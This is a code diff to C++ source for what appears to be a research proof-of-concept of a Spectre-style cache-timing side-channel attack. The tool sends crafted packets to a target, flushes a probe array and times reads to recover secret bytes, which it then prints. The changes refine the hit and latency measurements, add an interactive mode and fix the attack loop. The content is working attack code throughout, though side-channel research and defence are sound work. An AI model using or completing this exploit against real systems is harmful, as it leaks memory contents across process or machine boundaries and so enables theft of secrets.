@@ -69,7 +69,7 @@ Analysis code
 /* Default to a cache hit threshold of 80 */
 uint64_t cache_hit_threshold = 80; // TODO: compile-time constexpr...?
 
-#define ACCURATE_LATENCIES
+//#define ACCURATE_LATENCIES
 #ifdef ACCURATE_LATENCIES
 std::vector< std::array<uint8_t,256> > latency_ts;  // timeseries of access latencies
 #endif
@@ -283,8 +283,8 @@ void measure_sidechannel(size_t iteration) {
   volatile unsigned int junk = 0;
 
   /* Time reads. Order is lightly mixed up to avoid stride prediction */
-  for (int i = 0; i < 256; i++) {
-    int mix_i = ((i * 167) + 13) & 255;
+  for (size_t i = 0; i < 256; i++) {
+    auto mix_i = ((i * 167) + iteration*13) & 255;
     volatile auto* addr = &array2[mix_i * 512];
 
   /*
@@ -338,12 +338,13 @@ void measure_sidechannel(size_t iteration) {
 #endif
 #endif
     // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
-///      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
-    if (time2 <= cache_hit_threshold) {
+    // - Note, this entire branch can be eliminated
+//      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
 //      results[mix_i]++; /* cache hit - add +1 to score for this value */
-      hit_ts[iteration].set(mix_i);
-    }
+//    }
 
+    // Record hit and/or latency measurements:
+    hit_ts[iteration][mix_i] = time2 <= cache_hit_threshold;
 #ifdef ACCURATE_LATENCIES
     latency_ts[iteration][mix_i] = static_cast<uint8_t>(time2);
 #endif
@@ -459,7 +460,7 @@ void parse_args(int argc, char* const argv[]) {
 
 
 template <typename T>
-std::vector<size_t> sort_indexes(const std::vector<T>& v) {
+std::vector<size_t> sort_indexes(const T& v) {
   // Create index vector of identical size to vector v:
   std::vector<size_t> idx(v.size());
   std::iota(idx.begin(), idx.end(), 0);
@@ -492,14 +493,17 @@ void send_worker(uint16_t port = 7777) {
 
   size_t tries = 0;
   for (;;) {
+//#define INTERACTIVE
+#ifdef INTERACTIVE
     std::string in;
     std::cout << "Ready to send?" << std::endl;
     std::cin >> in;
-    if (in.at(0) != 'r') {
-      if (++m.x > (target_x_offset + target_len)) {
+    if (in.at(0) == 'n') {
+      if (++m.x >= (target_x_offset + target_len)) {
         break;  // break out of forever loop.
       }
     }
+#endif
 
     // Timeseries intialization:
     // - reservation avoids memory allocation during side-channel anaylsis.
@@ -514,7 +518,7 @@ void send_worker(uint16_t port = 7777) {
     // Repeat attack 100 times / byte:
     // - TODO: replace with a dynamic confidence mechanism?...
     while (++tries % MAX_MEASUREMENTS != 0) {
-      const auto idx = tries-1;
+      const auto attempt = tries-1;
 
       // Ensure side-channel array is uncached:
       flush_array2(); // Does this work on read-only shared memory?...
@@ -523,10 +527,28 @@ void send_worker(uint16_t port = 7777) {
       auto bytes = s.send(&m, sizeof(m));
       if (bytes > 0) {
         bytes = s.recv(buf, sizeof(buf));
-        measure_sidechannel(idx);
+        measure_sidechannel(attempt);
+
+        assert(bytes == sizeof(msg)); // TODO: maybe just skip if receive a weird packet?
+        const msg& reply = reinterpret_cast<msg&>(buf);
+        const auto training_x = reply.x + 1;  // FIXME: not sure why off by one...
+
+//#define DEBUG
 #ifdef DEBUG
-        std::cout << "["<<port<<"]- Measured " << hit_ts[idx].count()
-                  << " hits." << std::endl;
+        std::cout << "training_x: "<< training_x << std::endl;
+        auto hits_idx = sort_indexes(hit_ts.at(attempt));
+        for (size_t idx : hits_idx) {
+          const auto hit = latency_ts.at(attempt).at(idx);
+          if (!hit_ts.at(attempt).test(idx)) { break; }
+          std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
+                    << hit << " cycles." << std::endl;
+        }
+#endif
+
+        // Omit training_x used from measurement:
+        hit_ts.at(attempt).reset(training_x);
+#ifdef ACCURATE_LATENCIES
+        latency_ts.at(attempt).at(training_x) = std::numeric_limits<uint8_t>::max();
 #endif
       }
       else {
@@ -547,7 +569,7 @@ void send_worker(uint16_t port = 7777) {
       }
     }
     // Output results from attack:
-    std::cout << "Results for target_x_offset: " << target_x_offset << '\n';
+    std::cout << "Results for target_x_offset: " << m.x << '\n';
     auto counts_idx = sort_indexes(counts);
     size_t last = std::numeric_limits<size_t>::max();
     for (size_t idx : counts_idx) {
@@ -563,11 +585,16 @@ void send_worker(uint16_t port = 7777) {
 
     // Reset measurements:
     tries = 0;
+#ifndef INTERACTIVE
+    if (++m.x >= (target_x_offset + target_len)) {
+      break;  // break out of forever loop.
+    }
+#endif
   }
 
   // Print out secret:
   std::cout << "Finished reading " << target_len
-            << "bytes at offset " << target_x_offset << ":\n"
+            << " bytes at offset " << target_x_offset << ":\n"
             << make_printable(secret) << std::endl;
 }
 
